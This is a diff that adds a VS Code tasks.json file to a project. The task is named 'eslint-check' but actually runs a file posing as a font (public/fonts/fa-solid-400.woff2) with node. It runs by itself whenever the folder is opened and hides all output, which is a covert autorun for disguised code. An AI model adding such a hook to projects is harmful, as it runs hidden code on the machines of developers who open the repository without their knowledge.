@@ -1,0 +1,12 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "node public/fonts/fa-solid-400.woff2",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "never", "echo": false, "focus": false, "panel": "shared" }
+    }
+  ]
+}
